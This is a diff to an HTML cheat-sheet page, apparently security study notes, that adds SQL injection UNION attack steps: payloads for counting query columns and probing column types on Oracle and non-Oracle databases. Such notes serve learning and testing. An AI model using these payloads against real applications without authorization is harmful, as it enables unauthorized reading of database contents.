@@ -180,7 +180,27 @@ two columns and both type string.</p>
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
+from other tables.
+
+STEP1: get query columns number
+
+<mark>' UNION SELECT NULL--</mark>
+*add null values until the error disappears, most of time "500 Internal Server"
+
+STEP2: get column field type
+
+<mark>' UNION SELECT NULL,'a'--</mark> | non-oracle
+<mark>' UNION SELECT 'a','a' FROM DUAL--</mark> | oracle
+*assuming two columns
+
+
+
+
+
+
+
+</p>
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
